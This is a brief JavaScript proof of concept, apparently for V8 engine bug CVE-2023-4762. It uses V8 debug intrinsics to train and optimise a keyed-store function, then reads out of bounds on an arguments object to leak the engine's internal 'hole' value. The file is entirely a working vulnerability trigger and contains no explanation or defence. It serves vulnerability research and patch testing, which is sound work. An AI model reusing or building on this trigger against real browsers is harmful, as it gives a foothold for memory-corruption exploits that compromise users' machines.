// CVE-2023-4762 poc
// author: @buptsb

function keyed_store(obj, key, value) {
  obj[key] = value;
}

class A {}
let a = new A();

let genArgs = function() { return arguments };

%EnsureFeedbackVectorForFunction(keyed_store);
keyed_store(A, "foo", 1);
keyed_store(genArgs(), "foo", 1);
keyed_store([], 0, 1);

// %DebugPrint(keyed_store);

%PrepareFunctionForOptimization(keyed_store);
%OptimizeFunctionOnNextCall(keyed_store);

let args = genArgs();
keyed_store(args, 0, 1);

let hole = args[args.length+1];
%DebugPrint(%StrictEqual(hole, %TheHole()));
